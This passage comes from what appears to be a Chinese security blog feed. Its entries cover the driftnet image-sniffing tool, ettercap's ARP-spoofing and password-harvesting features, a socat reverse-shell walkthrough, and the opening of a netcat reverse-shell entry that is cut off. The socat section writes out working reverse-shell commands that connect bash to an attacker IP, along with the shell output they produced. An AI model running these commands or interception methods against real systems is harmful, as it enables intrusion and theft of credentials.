    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>driftnet 是用于捕获图片的工具，既可以离线获取，也就是 pcap 数据包中获取，也可以在线获取</p><p>kali 中默认存在该工具</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>driftnet [options] [filter code]</p><h2 id="options"><a href="#options" class="headerlink" title="options"></a>options</h2><h3 id="h"><a href="#h" class="headerlink" title="-h"></a>-h</h3><h3 id="v-展示详情"><a href="#v-展示详情" class="headerlink" title="-v 展示详情"></a>-v 展示详情</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="b-捕获到新的图片时发出嘟嘟声音"><a href="#b-捕获到新的图片时发出嘟嘟声音" class="headerlink" title="-b 捕获到新的图片时发出嘟嘟声音"></a>-b 捕获到新的图片时发出嘟嘟声音</h3><h3 id="i-interface-设置数据包监听接口，默认会以混杂模式监听所有接口"><a href="#i-interface-设置数据包监听接口，默认会以混杂模式监听所有接口" class="headerlink" title="-i interface 设置数据包监听接口，默认会以混杂模式监听所有接口"></a>-i interface 设置数据包监听接口，默认会以混杂模式监听所有接口</h3><h3 id="f-file-代替监听接口，从-pcap-文件中读取"><a href="#f-file-代替监听接口，从-pcap-文件中读取" class="headerlink" title="-f file 代替监听接口，从 pcap 文件中读取"></a>-f file 代替监听接口，从 pcap 文件中读取</h3><h3 id="p-设置监听端口不使用混杂模式"><a href="#p-设置监听端口不使用混杂模式" class="headerlink" title="-p 设置监听端口不使用混杂模式"></a>-p 设置监听端口不使用混杂模式</h3><h3 id="a-附加模式，捕获的图片将保存在目录中，不会在前台展示"><a href="#a-附加模式，捕获的图片将保存在目录中，不会在前台展示" class="headerlink" title="-a 附加模式，捕获的图片将保存在目录中，不会在前台展示"></a>-a 附加模式，捕获的图片将保存在目录中，不会在前台展示</h3><h3 id="m-number-附加模式下，也就是-a-下，捕获图片的数量，超过数量之后会删除"><a href="#m-number-附加模式下，也就是-a-下，捕获图片的数量，超过数量之后会删除" class="headerlink" title="-m number  附加模式下，也就是 -a 下，捕获图片的数量，超过数量之后会删除"></a>-m number  附加模式下，也就是 -a 下，捕获图片的数量，超过数量之后会删除</h3><h3 id="x-prefix-设置保存的图片前缀，默认是-driftnet"><a href="#x-prefix-设置保存的图片前缀，默认是-driftnet" class="headerlink" title="-x prefix  设置保存的图片前缀，默认是 driftnet-*"></a>-x prefix  设置保存的图片前缀，默认是 driftnet-*</h3><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root💀kali2021)-[/home/kali/img]<br>└─# ls<br>driftnet<span class="hljs-string">-639933</span>ef6b8b4567.jpeg  driftnet<span class="hljs-string">-63997</span>b5500c4c3af.png  driftnet<span class="hljs-string">-63997</span>b552c7c62c2.png  driftnet<span class="hljs-string">-63997</span>b55569951fe.png  driftnet<span class="hljs-string">-63997</span>b5a4239dc03.png<br>driftnet<span class="hljs-string">-639933</span>fa327b23c6.jpeg  driftnet<span class="hljs-string">-63997</span>b5500e3dfe6.png  driftnet<span class="hljs-string">-63997</span>b552cb6a6a4.png  driftnet<span class="hljs-string">-63997</span>b5556c28e34.png  driftnet<span class="hljs-string">-63997</span>b5a45dc439d.png<br>driftnet<span class="hljs-string">-63993414643</span>c9869.jpeg  driftnet<span class="hljs-string">-63997</span>b5500e4b973.png  driftnet<span class="hljs-string">-63997</span>b552cdd5b39.png  driftnet<span class="hljs-string">-63997</span>b5557071613.png  driftnet<span class="hljs-string">-63997</span>b5a461bc834.png<br><br></code></pre></td></tr></table></figure><h3 id="d-directory-设置图片保存目录，driftnet-退出时会清空临时目录和文件，但不会清空该目录"><a href="#d-directory-设置图片保存目录，driftnet-退出时会清空临时目录和文件，但不会清空该目录" class="headerlink" title="-d directory 设置图片保存目录，driftnet 退出时会清空临时目录和文件，但不会清空该目录"></a>-d directory 设置图片保存目录，driftnet 退出时会清空临时目录和文件，但不会清空该目录</h3><h3 id="s-从网络中抓取视频文件并播放，如果使用附加模式-a-将会以MPEG格式保存在文件夹中"><a href="#s-从网络中抓取视频文件并播放，如果使用附加模式-a-将会以MPEG格式保存在文件夹中" class="headerlink" title="-s 从网络中抓取视频文件并播放，如果使用附加模式 -a ,将会以MPEG格式保存在文件夹中"></a>-s 从网络中抓取视频文件并播放，如果使用附加模式 -a ,将会以MPEG格式保存在文件夹中</h3><h3 id="S-从网络中抓取视频文件，忽略图片文件"><a href="#S-从网络中抓取视频文件，忽略图片文件" class="headerlink" title="-S 从网络中抓取视频文件，忽略图片文件"></a>-S 从网络中抓取视频文件，忽略图片文件</h3><h3 id="M-command-设置抓取到的视频播放"><a href="#M-command-设置抓取到的视频播放" class="headerlink" title="-M command 设置抓取到的视频播放"></a>-M command 设置抓取到的视频播放</h3><h3 id="Z-username-启动-pcap-后删除-username-的权限"><a href="#Z-username-启动-pcap-后删除-username-的权限" class="headerlink" title="-Z username 启动 pcap 后删除 username 的权限"></a>-Z username 启动 pcap 后删除 username 的权限</h3><h3 id="l-列出系统的捕获接口"><a href="#l-列出系统的捕获接口" class="headerlink" title="-l 列出系统的捕获接口"></a>-l 列出系统的捕获接口</h3><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ldif">└─<span class="hljs-comment"># driftnet -l</span><br><span class="hljs-literal">-</span> 1.: eth0<br><br><span class="hljs-literal">-</span> 2.: any<br>Pseudo-device that captures on all interfaces<br><span class="hljs-literal">-</span> 3.: lo<br><br><span class="hljs-literal">-</span> 4.: bluetooth-monitor<br>Bluetooth Linux Monitor<br><span class="hljs-literal">-</span> 5.: nflog<br>Linux netfilter log (NFLOG) interface<br><span class="hljs-literal">-</span> 6.: nfqueue<br>Linux netfilter queue (NFQUEUE) interface<br><span class="hljs-literal">-</span> 7.: dbus-system<br>D-Bus system bus<br><span class="hljs-literal">-</span> 8.: dbus-session<br>D-Bus session bus<br></code></pre></td></tr></table></figure><h3 id="r-设置接口为监听模式，不适用于设置所有接口"><a href="#r-设置接口为监听模式，不适用于设置所有接口" class="headerlink" title="-r 设置接口为监听模式，不适用于设置所有接口"></a>-r 设置接口为监听模式，不适用于设置所有接口</h3><h3 id="g-开启-GTK-显示，默认模式"><a href="#g-开启-GTK-显示，默认模式" class="headerlink" title="-g 开启 GTK 显示，默认模式"></a>-g 开启 GTK 显示，默认模式</h3><h3 id="w-开启-HTTP-服务显示图片"><a href="#w-开启-HTTP-服务显示图片" class="headerlink" title="-w 开启 HTTP 服务显示图片"></a>-w 开启 HTTP 服务显示图片</h3><h3 id="W-设置-HTTP-服务端口，默认-9090"><a href="#W-设置-HTTP-服务端口，默认-9090" class="headerlink" title="-W 设置 HTTP 服务端口，默认 9090"></a>-W 设置 HTTP 服务端口，默认 9090</h3>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>arp_tool_ettercap</title>
    <link href="/2024/11/14/security/netsec/arpattack/arp_tool_ettercap/"/>
    <url>/2024/11/14/security/netsec/arpattack/arp_tool_ettercap/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Ettercap 是一款免费的基于 ARP 地址欺骗方式的网络嗅探工具，kali 默认自带该软件</p><h1 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h1><p>ettercap [OPTIONS] [TARGET1] [TARGET2]</p><p>如果 IPv6开启，TARGET 为 MAC&#x2F;IPs&#x2F;IPv6&#x2F;PORTS，否则为 MAC&#x2F;IPs&#x2F;PORTS</p><p>如果IP和端口是区间范围的，可以 &#x2F;192.168.0.1-30,40,50&#x2F;20,22,25</p><h2 id="两种嗅探模式"><a href="#两种嗅探模式" class="headerlink" title="两种嗅探模式"></a>两种嗅探模式</h2><h3 id="UNIFIED"><a href="#UNIFIED" class="headerlink" title="UNIFIED"></a>UNIFIED</h3><p>嗅探所有数据包，也就是中间人攻击</p><h3 id="BRTDGED"><a href="#BRTDGED" class="headerlink" title="BRTDGED"></a>BRTDGED</h3><p>嗅探双网卡之间数据包</p><h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h3 id="没有源和目的的概念"><a href="#没有源和目的的概念" class="headerlink" title="没有源和目的的概念"></a>没有源和目的的概念</h3><h3 id="两个target是为了获取一个到一个之间的双向流量"><a href="#两个target是为了获取一个到一个之间的双向流量" class="headerlink" title="两个target是为了获取一个到一个之间的双向流量"></a>两个target是为了获取一个到一个之间的双向流量</h3><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>如果 IPv6开启，TARGET 为 MAC&#x2F;IPs&#x2F;IPv6&#x2F;PORTS，否则为 MAC&#x2F;IPs&#x2F;PORTS</p><p>如果IP和端口是区间范围的，可以 &#x2F;192.168.0.1-30,40,50&#x2F;20,22,25</p><p>示例：</p><p>&#x2F;&#x2F;80 表示所有 mac 地址和所有 IP 地址的 80 端口</p><p>&#x2F;10.10.10.10&#x2F; 表示所有 mac 地址、10.10.10.10和所有端口</p><p>MAC 地址必须唯一，且为十六进制 00:11:22:33:44:55</p><p>IP地址 十进制点记法，区间地址使用 - 分割，多个 IP 地址使用 ; 分割。10.0.0.1-5;10.0.1.33 表示 10.0.0.1,2,3,4,5 和 10.0.1.33</p><p>端口，区间地址使用 - 分割，多个端口使用 ; 分割。20-25,80,110 表示 20，21，22，23，24，25，80，110</p><h1 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h1><h2 id="支持-SSH1"><a href="#支持-SSH1" class="headerlink" title="支持 SSH1"></a>支持 SSH1</h2><p>可以嗅探 用户名和密码，可以获取 SSH1 连接的数据</p><h2 id="支持-SSL"><a href="#支持-SSL" class="headerlink" title="支持 SSL"></a>支持 SSL</h2><p>可以嗅探 SSL 数据，假的证书显示给客户端</p><h2 id="支持在建立的连接中注入字符"><a href="#支持在建立的连接中注入字符" class="headerlink" title="支持在建立的连接中注入字符"></a>支持在建立的连接中注入字符</h2><p>向服务器模拟命令，向客户端模拟响应</p><h2 id="数据报过滤或丢弃"><a href="#数据报过滤或丢弃" class="headerlink" title="数据报过滤或丢弃"></a>数据报过滤或丢弃</h2><p>可以通过过滤脚本在 UDP、TCP 载荷中查询、替换或删除指定字符（甚至十六进制）</p><h2 id="远程嗅探隧道或route-mangling"><a href="#远程嗅探隧道或route-mangling" class="headerlink" title="远程嗅探隧道或route mangling"></a>远程嗅探隧道或route mangling</h2><p>可以通过Linux伪造接口或者集成插件嗅探隧道或路由破坏的远程连接，并进行中间人攻击</p><h2 id="支持插件"><a href="#支持插件" class="headerlink" title="支持插件"></a>支持插件</h2><p>可以自己编写插件，利用 ettercap 插件</p><h2 id="口令收集"><a href="#口令收集" class="headerlink" title="口令收集"></a>口令收集</h2><p>支持 TELNET, FTP, POP, RLOGIN, SSH1, ICQ, SMB, MySQL, HTTP, NNTP, X11, NAPSTER, IRC, RIP, BGP, SOCKS 5,  IMAP  4,  VNC,  LDAP, NFS, SNMP, HALF LIFE, QUAKE 3, MSN, YMSG 等协议，未来会支持更多</p><h2 id="被动系统信息收集"><a href="#被动系统信息收集" class="headerlink" title="被动系统信息收集"></a>被动系统信息收集</h2><p>可以不发送任何数据包收集系统信息，包含操作系统，运行的服务，开放端口，IP, mac地址和网络适配器供应商等</p><h2 id="杀死连接"><a href="#杀死连接" class="headerlink" title="杀死连接"></a>杀死连接</h2><p>支持 kill 当前连接表的连接，甚至所有连接</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>netsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>netsec</tag>
      
      <tag>arp</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_socat_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_socat_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_socat_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="socat"><a href="#socat" class="headerlink" title="socat"></a>socat</h2><h4 id="tcp"><a href="#tcp" class="headerlink" title="tcp"></a>tcp</h4><p>攻击机</p><p><strong>socat TCP-LISTEN:攻击port -</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">[root<span class="hljs-symbol">@10</span> tmp]<span class="hljs-meta"># socat TCP-LISTEN:1234 -</span><br></code></pre></td></tr></table></figure><p>靶机</p><p><strong>socat exec:’bash -i’,pty,stderr,setsid,sigint,sane tcp:攻击IP:攻击port</strong></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root💀kali2021)-<span class="hljs-selector-attr">[~]</span><br>└─# socat exec:<span class="hljs-string">&#x27;bash -i&#x27;</span>,pty,stderr,setsid,sigint,sane tcp:<span class="hljs-number">10.13</span>.<span class="hljs-number">8.56</span>:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure><p>攻击机获取到靶机权限</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">[root@<span class="hljs-number">10</span> tmp]<span class="hljs-comment"># socat TCP-LISTEN:1234 -</span><br>┌──(rootkali2021)-[~]<br>└─<span class="hljs-comment"># id</span><br><span class="hljs-built_in">id</span><br>用户<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>(root) 组<span class="hljs-built_in">id</span>=<span class="hljs-number">0</span>(root) 组=<span class="hljs-number">0</span>(root),<span class="hljs-number">4</span>(adm),<span class="hljs-number">20</span>(dialout),<span class="hljs-number">121</span>(wireshark),<span class="hljs-number">146</span>(kaboxer)<br></code></pre></td></tr></table></figure><p>靶机监听</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dns">┌──(root💀kali2021)-[~]<br>└─# netstat -anlp | grep <span class="hljs-number">1234</span><br>tcp        <span class="hljs-number">0</span>      <span class="hljs-number">0 10.210.128</span>.<span class="hljs-number">37:53676</span>     <span class="hljs-number">10.13.8.56</span>:<span class="hljs-number">1234</span>         ESTABLISHED <span class="hljs-number">3735496</span>/socat<br></code></pre></td></tr></table></figure><h4 id="udp"><a href="#udp" class="headerlink" title="udp"></a>udp</h4><p>攻击机</p><p><strong>socat udp-listen:攻击端口 -</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@110 test]# socat udp-listen:1234 -<br>bash: cannot <span class="hljs-built_in">set</span> terminal process<span class="hljs-built_in"> group </span>(1445706): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: <span class="hljs-literal">no</span> job control <span class="hljs-keyword">in</span> this shell<br>ubuntu@VM-8-5-ubuntu:/root$ id<br>id<br><span class="hljs-attribute">uid</span>=1000(ubuntu) <span class="hljs-attribute">gid</span>=1000(ubuntu) <span class="hljs-attribute">groups</span>=1000(ubuntu),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">(base) [root<span class="hljs-variable">@110</span> ~]<span class="hljs-comment"># ps -ef | grep 1234</span><br>root      <span class="hljs-number">2383</span> <span class="hljs-number">16144</span>  <span class="hljs-number">0</span> <span class="hljs-number">20</span>:<span class="hljs-number">16</span> pts/<span class="hljs-number">4</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> socat udp-<span class="hljs-keyword">listen</span>:<span class="hljs-number">1234</span> -<br></code></pre></td></tr></table></figure><p>靶机</p><p><strong>socat udp-connect:攻击IP:端口 exec:’bash -i’,pty,stderr,sane 2&gt;&amp;1&gt;&#x2F;dev&#x2F;null &amp;</strong></p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">socat udp-<span class="hljs-keyword">connect</span>:<span class="hljs-number">121.43</span><span class="hljs-number">.138</span><span class="hljs-number">.192</span>:<span class="hljs-number">1234</span> <span class="hljs-keyword">exec</span>:<span class="hljs-string">&#x27;bash -i&#x27;</span>,pty,stderr,sane <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span>&gt;<span class="hljs-regexp">/dev/null</span> &amp;<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">8</span>-<span class="hljs-number">5</span>-ubuntu:/root$ sudo netstat -anlp | grep <span class="hljs-number">1234</span><br><span class="hljs-attribute">udp</span>        <span class="hljs-number">0</span>      <span class="hljs-number">0</span> <span class="hljs-number">10.0.8.5:35413</span>          <span class="hljs-number">121.43.138.192:1234</span>     ESTABLISHED <span class="hljs-number">1445706</span>/socat<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>sectools</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>sectools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>attack_nc_shell</title>
    <link href="/2024/11/14/security/secattack/attack_shell/attack_nc_shell/"/>
    <url>/2024/11/14/security/secattack/attack_shell/attack_nc_shell/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>nc 反弹是基于 nc(netcat&#x2F;ncat)命令来进行的反弹</p><h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>目标系统中存在 nc 命令（默认系统中不会带有  nc 命令）</p><h2 id="nc-netcat-ncat-区别"><a href="#nc-netcat-ncat-区别" class="headerlink" title="nc netcat ncat 区别"></a>nc netcat ncat 区别</h2><p><strong>如果没有安装 ncat 或后安装 ncat ,nc命令就是 netcat 的软链</strong></p><p>没有安装 ncat 的情况</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs inform7"><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># nc<br>usage: nc <span class="hljs-comment">[-46cDdFhklNnrStUuvz]</span> <span class="hljs-comment">[-C certfile]</span> <span class="hljs-comment">[-e name]</span> <span class="hljs-comment">[-H hash]</span> <span class="hljs-comment">[-I length]</span><br>  <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-K keyfile]</span> <span class="hljs-comment">[-M ttl]</span> <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span><br>  <span class="hljs-comment">[-o staplefile]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[-R CAfile]</span><br>  <span class="hljs-comment">[-s sourceaddr]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>  <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[-Z peercertfile]</span><br>  <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># netcat<br>usage: nc <span class="hljs-comment">[-46cDdFhklNnrStUuvz]</span> <span class="hljs-comment">[-C certfile]</span> <span class="hljs-comment">[-e name]</span> <span class="hljs-comment">[-H hash]</span> <span class="hljs-comment">[-I length]</span><br>  <span class="hljs-comment">[-i interval]</span> <span class="hljs-comment">[-K keyfile]</span> <span class="hljs-comment">[-M ttl]</span> <span class="hljs-comment">[-m minttl]</span> <span class="hljs-comment">[-O length]</span><br>  <span class="hljs-comment">[-o staplefile]</span> <span class="hljs-comment">[-P proxy_username]</span> <span class="hljs-comment">[-p source_port]</span> <span class="hljs-comment">[-R CAfile]</span><br>  <span class="hljs-comment">[-s sourceaddr]</span> <span class="hljs-comment">[-T keyword]</span> <span class="hljs-comment">[-V rtable]</span> <span class="hljs-comment">[-W recvlimit]</span> <span class="hljs-comment">[-w timeout]</span><br>  <span class="hljs-comment">[-X proxy_protocol]</span> <span class="hljs-comment">[-x proxy_address<span class="hljs-comment">[:port]</span>]</span> <span class="hljs-comment">[-Z peercertfile]</span><br>  <span class="hljs-comment">[destination]</span> <span class="hljs-comment">[port]</span><br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ncat<br>-bash: /usr/bin/ncat: 没有那个文件或目录<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># whereis nc<br>nc: /usr/bin/nc /usr/share/<span class="hljs-keyword">man</span>/man1/nc.1.gz<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ls -lath /usr/bin/nc<br>lrwxrwxrwx 1 root root 22 2月   1 14:41 /usr/bin/nc -&gt; /etc/alternatives/nmap<br><span class="hljs-comment">[root@iZbp1191gh7vw52537lyxrZ ~]</span># ls -lath /etc/alternatives/nmap<br>lrwxrwxrwx 1 root root 15 2月   1 14:41 /etc/alternatives/nmap -&gt; /usr/bin/netcat<br></code></pre></td></tr></table></figure><p>后安装 ncat 的情况</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis nc<br>nc: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>nc.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis netcat<br>netcat: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/netcat /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>netcat.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis ncat<br>ncat: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/ncat /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>ncat.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>nc<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">22</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc -&gt; /</span>etc<span class="hljs-regexp">/alternatives/</span>nmap<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-operator">/</span>nmap<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">15</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">44</span> <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-regexp">/nmap -&gt; /</span>usr<span class="hljs-regexp">/bin/</span>netcat<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lat <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>netcat<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root <span class="hljs-number">45328</span> <span class="hljs-number">12</span>月 <span class="hljs-number">24</span> <span class="hljs-number">12</span>:<span class="hljs-number">30</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>netcat<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>ncat<br><span class="hljs-operator">-</span>rwxr<span class="hljs-operator">-</span>xr<span class="hljs-operator">-</span>x <span class="hljs-number">1</span> root root 372K <span class="hljs-number">8</span>月   <span class="hljs-number">9</span> <span class="hljs-number">2019</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>ncat<br></code></pre></td></tr></table></figure><p><strong>如果先安装 ncat 或只安装 ncat ，nc 就是 ncat 的软链</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# whereis nc<br>nc: <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc /</span>usr<span class="hljs-regexp">/share/</span>man<span class="hljs-regexp">/man1/</span>nc.<span class="hljs-number">1</span>.gz<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/usr/</span>bin<span class="hljs-operator">/</span>nc<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">22</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">50</span> <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/nc -&gt; /</span>etc<span class="hljs-regexp">/alternatives/</span>nmap<br>[root<span class="hljs-meta">@iZbp1191gh7vw52537lyxrZ</span> <span class="hljs-operator">~</span>]# ls <span class="hljs-operator">-</span>lath <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-operator">/</span>nmap<br>lrwxrwxrwx <span class="hljs-number">1</span> root root <span class="hljs-number">13</span> <span class="hljs-number">2</span>月   <span class="hljs-number">1</span> <span class="hljs-number">14</span>:<span class="hljs-number">50</span> <span class="hljs-regexp">/etc/</span>alternatives<span class="hljs-regexp">/nmap -&gt; /</span>usr<span class="hljs-regexp">/bin/</span>ncat<br></code></pre></td></tr></table></figure><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>CentOS没有 ncat 安装包，但是 ncat 是 nmap 的依赖，安装 nmap 即可安装 ncat</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@iZbp1191gh7vw52537lyxrZ ~]<span class="hljs-comment"># yum install ncat</span><br>已加载插件：fastestmirror<br>Loading mirror speeds <span class="hljs-keyword">from</span> cached hostfile<br>没有可用软件包 ncat。<br>错误：无须任何处理<br></code></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 